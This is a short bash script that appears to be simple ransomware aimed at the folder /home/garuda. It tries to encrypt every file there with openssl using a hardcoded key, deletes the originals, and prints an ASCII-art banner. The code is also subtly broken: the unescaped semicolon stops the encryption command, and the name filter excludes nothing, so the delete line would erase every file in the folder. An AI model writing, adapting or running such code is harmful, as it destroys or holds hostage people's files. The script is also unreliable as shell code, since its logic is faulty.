#!/bin/bash

# Folder to encrypt files from
folder="/home/garuda"

# Encryption key
key="my_secret_password_password"

# Encrypt all files in the folder
find "$folder" -type f -not -name ".enc" -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k "$key" ;

# Delete original files
find "$folder" -type f -not -name ".enc" -delete


echo " (              (       *  "
echo " )\ )    (      )\ )  (  \`       )"
echo "(()/(    )\    (()/(  )\))(   ( /("
echo " /(_))((((_)(   /(_))((_)()\  )\())"
echo "(_))_  )\ _ )\ (_))  (_()((_)((_)\ "
echo " |   \ (_)_\(_)| |   |  \/  | / (_)"
echo " | |) | / _ \  | |__ | |\/| | | |  "
echo " |___/ /_/ \_\ |____||_|  |_| |_| "
